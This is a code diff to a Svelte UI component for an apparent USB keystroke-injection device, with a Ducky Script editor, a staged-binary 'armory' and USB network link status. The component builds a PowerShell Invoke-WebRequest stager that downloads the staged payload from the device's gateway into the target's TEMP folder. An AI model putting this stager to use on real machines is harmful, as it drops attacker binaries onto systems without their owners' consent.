@@ -23,6 +23,7 @@
   import {
     canRun,
     canSave,
+    editorNavigation,
     payload,
     payloadState,
     runPayload,
@@ -37,12 +38,14 @@
   import {
     armoryNotice,
     armoryFiles,
+    armoryMetrics,
     deleteBinary,
     uploadBinary,
     uploadingBinary,
     uploadProgress,
   } from '../stores/binary';
   import { keyboard } from '../stores/keyboard';
+  import { ncmLink } from '../stores/usb';
 
   // --- Editor Local States ---
   let textarea = $state<HTMLTextAreaElement | null>(null);
@@ -72,12 +75,15 @@
     'inline-flex h-8 min-h-8 w-21 appearance-none items-center justify-center gap-1.5 whitespace-nowrap rounded-lg border px-0 text-xs font-medium leading-none transition-colors cursor-pointer disabled:cursor-not-allowed disabled:opacity-40';
   const ghostButton = `${buttonClass} border-(--button-ghost-border) bg-(--button-ghost-bg) text-(--button-ghost-text) hover:bg-(--button-ghost-hover)`;
   const primaryButton = `${buttonClass} border-(--button-primary-border) bg-(--button-primary-bg) text-(--button-primary-text) hover:bg-(--button-primary-hover)`;
-  const gatewayUrl = 'http://192.168.7.1';
-  const sampleAssetName = $derived(
-    $armoryFiles.find((file) => file.kind !== 'ducky')?.name || 'payload.bin',
+  const stagedBinary = $derived($armoryFiles.find((file) => file.kind !== 'ducky'));
+  const gatewayUrl = $derived($ncmLink.root_url || 'http://192.168.7.1');
+  const sampleAssetName = $derived(stagedBinary?.name || 'payload.bin');
+  const stagedBinarySize = $derived($armoryMetrics.staged_binary_bytes || stagedBinary?.size || 0);
+  const stagedBinaryUrl = $derived(
+    `${gatewayUrl}/api/armory/${encodeURIComponent(sampleAssetName)}`,
   );
   const stagerReference = $derived.by(() => {
-    const assetUrl = `${gatewayUrl}/api/armory/${encodeURIComponent(sampleAssetName)}`;
+    const assetUrl = stagedBinaryUrl;
 
     if ($keyboard.os === 'WIN') {
       return `powershell -c "Invoke-WebRequest -Uri '${assetUrl}' -OutFile '$env:TEMP\\${sampleAssetName}'"`;
@@ -117,6 +123,20 @@
     payloadState.set('Unsaved draft');
     validation.set(null);
     validationModalOpen.set(false);
+  }
+
+  function editorOffset(value: string, line: number, column: number) {
+    let offset = 0;
+    let currentLine = 1;
+
+    while (offset < value.length && currentLine < line) {
+      if (value[offset] === '\n') currentLine += 1;
+      offset += 1;
+    }
+
+    const lineEnd = value.indexOf('\n', offset);
+    const maxOffset = lineEnd === -1 ? value.length : lineEnd;
+    return Math.min(offset + column - 1, maxOffset);
   }
 
   // --- Binary Armory Functions ---
@@ -173,6 +193,20 @@
       window.removeEventListener('resize', measure);
     };
   });
+
+  $effect(() => {
+    const request = $editorNavigation;
+    if (!textarea || request.sequence === 0) return;
+
+    const offset = editorOffset($payload, request.line, request.column);
+    textarea.focus();
+    textarea.setSelectionRange(offset, offset);
+    textarea.scrollTop = Math.max(
+      0,
+      (request.line - 1) * metrics.lineHeight - textarea.clientHeight / 3,
+    );
+    syncScroll();
+  });
 </script>
 
 <section class="flex min-h-0 shrink-0 flex-col">
@@ -207,6 +241,9 @@
         >
           Ducky Script Editor
         </h2>
+        <span class="ml-auto font-mono text-[10px] text-(--text-3)">
+          {$keyboard.os} · {$keyboard.layout}
+        </span>
       </div>
 
       <div class="grid h-112 min-h-0 grid-cols-[3rem_minmax(0,1fr)] sm:h-128">
@@ -275,7 +312,7 @@
       </div>
 
       <div
-        class="flex flex-col items-stretch justify-between gap-4 border-t border-(--border) bg-(--surface-3) px-4 py-2.5 sm:flex-row sm:flex-wrap sm:items-center"
+        class="sticky bottom-0 z-20 flex flex-col items-stretch justify-between gap-4 border-t border-(--border) bg-(--surface-3) px-4 py-2.5 sm:flex-row sm:flex-wrap sm:items-center"
       >
         {#if $validation?.blocking}
           <div class="flex min-w-0 flex-1 items-center gap-2.5" id="editor-status">
@@ -338,6 +375,35 @@
           Binary Armory
         </h2>
       </div>
+
+      <dl
+        class="m-0 grid border-b border-(--border) bg-(--surface) sm:grid-cols-[0.7fr_0.7fr_0.9fr_minmax(0,2fr)]"
+      >
+        <div class="border-b border-(--border) px-3.5 py-2.5 sm:border-r sm:border-b-0">
+          <dt class="text-[10px] font-medium text-(--text-3)">Staged binary</dt>
+          <dd class="m-0 mt-0.5 text-xs font-medium text-(--text)">
+            {stagedBinary ? 'Present' : 'Absent'}
+          </dd>
+        </div>
+        <div class="border-b border-(--border) px-3.5 py-2.5 sm:border-r sm:border-b-0">
+          <dt class="text-[10px] font-medium text-(--text-3)">Exact size</dt>
+          <dd class="m-0 mt-0.5 font-mono text-xs text-(--text)">
+            {stagedBinarySize} B
+          </dd>
+        </div>
+        <div class="border-b border-(--border) px-3.5 py-2.5 sm:border-r sm:border-b-0">
+          <dt class="text-[10px] font-medium text-(--text-3)">NCM accessible</dt>
+          <dd class="m-0 mt-0.5 text-xs font-medium text-(--text)">
+            {stagedBinary && $ncmLink.active ? 'Yes' : 'No'}
+          </dd>
+        </div>
+        <div class="min-w-0 px-3.5 py-2.5">
+          <dt class="text-[10px] font-medium text-(--text-3)">NCM URL</dt>
+          <dd class="m-0 mt-0.5 break-all font-mono text-xs text-(--text)" title={stagedBinaryUrl}>
+            {$ncmLink.active ? stagedBinaryUrl : 'Not available'}
+          </dd>
+        </div>
+      </dl>
 
       <div class="grid gap-4 px-3.5 pb-5 pt-3 bg-(--surface)">
         <div
